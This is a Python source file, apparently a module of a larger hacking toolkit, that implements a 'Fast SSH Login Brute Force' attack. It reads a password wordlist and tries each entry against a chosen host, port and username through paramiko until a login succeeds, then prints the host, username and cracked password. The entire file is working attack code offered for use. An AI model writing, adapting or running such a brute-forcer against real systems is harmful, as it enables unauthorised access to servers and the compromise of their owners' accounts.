# Author: billalxcode
# Version: 1.0
# Reg: sshbrute

import sys
import paramiko
from paramiko import ssh_exception
from paramiko.ssh_exception import AuthenticationException
from threading import Thread
from src.core.handler import RegisterCommand
from src.modules.base.api import BaseModules
from src.modules.base.api import BaseAction
from src.utils.terminal import Terminal
from src.utils.terminal import MESSAGE_NORMAL, COLOR_RED, COLOR_RESET, COLOR_GREEN, MESSAGE_ERROR
from src.utils.utils import isfile, isdir, basename
from src.utils.dateutil import get_timestamp, calculate_worker
from src.utils.banner import random_banner

class LocalError(Exception):
    pass

class Core:
    def __init__(self, terminal: Terminal) -> None:
        self.terminal = terminal

        self.PORT       = 22
        self.TIMEOUT    = 30
        self.TARGET     = ""
        self.USERNAME   = ""
        self.WORDLISTS  = []
        self.index      = 0
        self.isrunning  = True
        self.password   = None
        self.errors     = None

    def set_target(self, target: str):
        self.TARGET = target

    def set_port(self, port: int = 22):
        self.PORT = port

    def set_username(self, username: str):
        self.USERNAME = username

    def set_wordlist(self, wordlist: list):
        self.index = 0
        self.WORDLISTS = wordlist

    def process(self):
        while self.isrunning:
            SSH_CORE = paramiko.SSHClient()
            SSH_CORE.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                password = self.WORDLISTS[self.index]
                SSH_CORE.connect(self.TARGET, self.PORT, self.USERNAME, password, timeout=self.TIMEOUT, allow_agent=False, look_for_keys=False)
                self.isrunning = False
                self.password = password
            except AuthenticationException: pass
            except (Exception, ssh_exception.SSHException, ssh_exception.PasswordRequiredException) as expt:
                self.isrunning = False
                self.errors = f"{expt}"
            SSH_CORE.close()
            if self.index > len(self.WORDLISTS):
                self.isrunning = False
            else:
                self.index += 1

    def run(self):
        start_time = get_timestamp()
        self.terminal.console(f"Process target {self.TARGET}:{self.PORT}")
        th = Thread(target=self.process)
        th.setDaemon(True)
        th.start()
        while th.is_alive():
            print (f"Process index {self.index}/{len(self.WORDLISTS)}")
            self.terminal.cursor_up()
        try:
            th.join()
        except:pass
        self.terminal.clear_end_line()
        print(f"\nTime elapsed: {calculate_worker(start_time)}s")
        if self.errors is not None:
            self.terminal.console(f"{self.errors}", MESSAGE_ERROR, False)
        if self.password is None:
            self.terminal.console(f"Password not found", self.terminal.warning, False)
            return False
        else:
            self.terminal.console(f"Hostname: {self.TARGET}")
            self.terminal.console(f"Port: {self.PORT}")
            self.terminal.console(f"Username: {self.USERNAME}")
            self.terminal.console(f"Password: {self.password}")
            return True

class Connection(Thread):
    def __init__(self, username, password, target, port, timeout):
        # Reference: https://github.com/R4stl1n/SSH-Brute-Forcer/blob/master/src/Connection.py
        self.username = username
        self.password = password
        self.target = target
        self.port = port
        self.timeout = timeout
        self.authenticated = False

    def run(self):
        SSH_CORE = paramiko.SSHClient()
        SSH_CORE.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            SSH_CORE.connect(self.target, self.port, self.username, self.password, timeout=self.timeout, allow_agent=False, look_for_keys=False)
            self.authenticated = True
            SSH_CORE.close()
        except:
           self.authenticated = False

class Action(BaseAction):
    def __init__(self, terminal: Terminal) -> None:
        self.terminal = terminal
        self.core = Core(self.terminal)

        self.environments = {
            "raw": True, # Read mode (raw or byte)
            "port": 22, # SSH Port connection
            "target": None, # SSH Hostname connection
            "timeout": 30, # SSH Timeout connection
            "pathlist": None, # Wordlist filename
            "wordlist": None, # Wordlist after read from pathlist
            "username": None, # SSH Username
            "encoding": "utf-8", # Read content encoding
            "chunksize": 1024, # Read content chunk size
        }

    def onSet(self, argument: dict = {}):
        user_argument = argument["user"]
        if user_argument is None:
            self.terminal.console(f"set <type> <value>", self.terminal.normal, False)
            return False
        else:
            argument_length = len(user_argument)
            if argument_length == 0 or argument_length == 1 or argument_length > 3:
                self.terminal.console(f"set <type> <value>", self.terminal.normal, False)
                return False
            else:
                if user_argument[0] == "pathlist":
                    val = user_argument[1]
                    if val.strip() == "":
                        self.terminal.console(f"set <type> <value>", self.terminal.normal, False)
                        return False
                    elif isfile(val):
                        self.environments["pathlist"] = val
                        return True
                    elif isdir(val):
                        self.terminal.console(f"{val}: is a directory", MESSAGE_NORMAL, False)
                    else:
                        self.terminal.console(f"{val}: No such file or directory", MESSAGE_NORMAL, False)
                        return False
                elif user_argument[0] == "target":
                    val = user_argument[1]
                    self.environments["target"] = val
                    return True
                elif user_argument[0] == "encoding":
                    val = user_argument[1]
                    self.environments["encoding"] = val
                    return True
                elif user_argument[0] == "chunksize":
                    val = user_argument[1]
                    if val.isdigit():
                        self.environments["chunksize"] = int(val)
                        return True
                    else:
                        self.terminal.console(f"Invalid value", MESSAGE_NORMAL, False)
                        return False
                elif user_argument[0] == "port":
                    val = user_argument[1]
                    if val.isdigit():
                        self.environments["port"] = int(val)
                        return True
                    else:
                        self.terminal.console(f"Invalid value", MESSAGE_NORMAL, False)
                        return False
                elif user_argument[0] == "timeout":
                    val = user_argument[1]
                    if val.isdigit():
                        self.environments["timeout"] = int(val)
                        return True
                    else:
                        self.terminal.console(f"Invalid value", MESSAGE_NORMAL, False)
                        return False
                elif user_argument[0] == "username":
                    val = user_argument[1]
                    self.environments["username"] = val
                    return True
                elif user_argument[0] == "raw":
                    val = user_argument[1]
                    if val.lower() == "true" or val == "1":
                        self.environments["raw"] = True
                        return True
                    elif val.lower() == "false" or val == "0":
                        self.environments["raw"] = False
                        return True
                    else:
                        self.terminal.console(f"Invalid value, 'true', 'false', '1', '0'", MESSAGE_NORMAL, False)
                        return False

    def onOptions(self, argument: dict = {}):
        environments = self.environments
        user_argument = argument["user"]
        try:
            if user_argument is None: raise LocalError
            else:
                argument_length = len(user_argument)
                if argument_length == 0 or argument_length > 1:
                    raise LocalError
                else:
                    if user_argument[0] in self.environments:
                        environments = {}
                        environments[user_argument[0]] = self.environments[user_argument[0]]
                        raise LocalError
        except LocalError:
            output = ""
            for environment in environments:
                value = ""
                if self.environments[environment] is None:
                    value += COLOR_RED
                    value += f"{self.environments[environment]}"
                else:
                    value += COLOR_GREEN
                    if environment == "wordlist":
                        value += f"{len(self.environments[environment])}"
                    elif environment == "pathlist":
                        value += f"{basename(self.environments[environment])}"
                    else:
                        value += f"{self.environments[environment]}"
                value += COLOR_RESET
                output += f"{environment}:{value}"
                output += " " * 4
            self.terminal.console(output, MESSAGE_NORMAL, False)

    def onRead(self, argument: dict = {}):
        if self.environments["pathlist"] is None:
            self.terminal.console(f"Pathlist is not definied", self.terminal.error, False)
        else:
            temp = ""
            chunksize = self.environments["chunksize"]
            encoding = self.environments["encoding"]
            mode = "r"
            if self.environments["raw"] is not True:
                mode += "b"
            with open(self.environments["pathlist"], mode, encoding=encoding) as File:
                while True:
                    data = File.read(chunksize)
                    if not data: break
                    else:
                        temp += data
            self.environments["wordlist"] = temp.splitlines()

    def onRun(self, argument: dict = {}):
        if self.check_isNone() is False: return False
        else:
            if self.environments["wordlist"] is None or len(self.environments["wordlist"]) == 0:
                self.terminal.console(f"Wordlist is empty", MESSAGE_NORMAL, False)
                return False
            else:
                self.core.set_target(self.environments["target"])
                self.core.set_port(self.environments["port"])
                self.core.set_username(self.environments["username"])
                self.core.set_wordlist(self.environments["wordlist"])
                self.core.run()

class Apps(BaseModules):
    def __init__(self, regcmd: RegisterCommand = None) -> None:
        BaseModules.__init__(self)

        self.AUTHOR = "billalxcode"
        self.VERSION = "1.0"
        self.DESCRIPTION = "Fast SSH Login Brute Force"
        self.WARNING_MSG = "This module is still under development, there may be errors."

        self.action = Action(self.terminal)
        self.regcmd = regcmd

    def initialize(self):
        self.regcmd.register(self.REG)
        self.regcmd.handle(self.REG, "set", self.action.onSet, self.action.dict2tuple(["wordlist"]))
        self.regcmd.handle(self.REG, "options", self.action.onOptions, self.action.dict2tuple())
        self.regcmd.handle(self.REG, "read", self.action.onRead)
        self.regcmd.handle(self.REG, "run", self.action.onRun)